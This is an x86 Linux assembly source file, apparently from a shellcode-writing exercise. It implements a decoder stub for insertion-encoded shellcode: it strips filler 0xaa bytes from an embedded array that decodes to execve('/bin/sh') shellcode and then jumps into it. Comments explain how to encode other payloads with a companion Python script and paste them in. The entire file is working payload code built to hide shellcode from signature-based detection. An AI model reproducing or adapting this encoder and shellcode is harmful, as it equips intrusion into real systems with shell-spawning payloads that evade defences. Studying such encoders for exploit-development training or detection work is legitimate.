;the bytes used in encoded variable are from the execv.asm file which is also not directly executable and needs C program to be executed. Use the opcode of the execv.asm and then
;encode it using insertion-encode.py and then use those bytes in encode variable


global _start

section .text
_start:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor esi, esi
	xor edi, edi

	jmp func1


func:
	

	pop esi

	;mov eax, esi
	;mov eax, [eax +1]
	;add eax, 1
	;mov eax, esi
	;mov bl, byte [eax +1]
	
	inc esi
	mov eax, esi
	inc esi
	mov ebx, esi



loopcmd:

	mov cl, byte [ebx]
	xor byte [ebx], 0x99
	je encoded                 ;added just after the above statement bcz the flag will change if the same je encoded was written anywhere below mob byte [eax], cl
	mov byte [eax], cl
	inc eax
	add ebx, 2
	
	
	
	jmp loopcmd



section .data  ;remove this comment if you want to make it directly executable and not executing with the help of C
	

func1:
	
	call func
	encoded: db 0xeb,0xaa,0x20,0xaa,0x31,0xaa,0xc0,0xaa,0x31,0xaa,0xdb,0xaa,0x5b,0xaa,0x88,0xaa,0x43,0xaa,0x07,0xaa,0x50,0xaa,0x89,0xaa,0xe5,0xaa,0x53,0xaa,0x31,0xaa,0xc9,0xaa,0x89,0xaa,0xe1,0xaa,0x31,0xaa,0xd2,0xaa,0x89,0xaa,0xea,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa,0x31,0xaa,0xc0,0xaa,0xb0,0xaa,0x01,0xaa,0x31,0xaa,0xdb,0xaa,0xcd,0xaa,0x80,0xaa,0xe8,0xaa,0xdb,0xaa,0xff,0xaa,0xff,0xaa,0xff,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x41,0xaa,0x99

	xor eax, eax
	mov eax, 1
	xor ebx, ebx
	int 0x80 
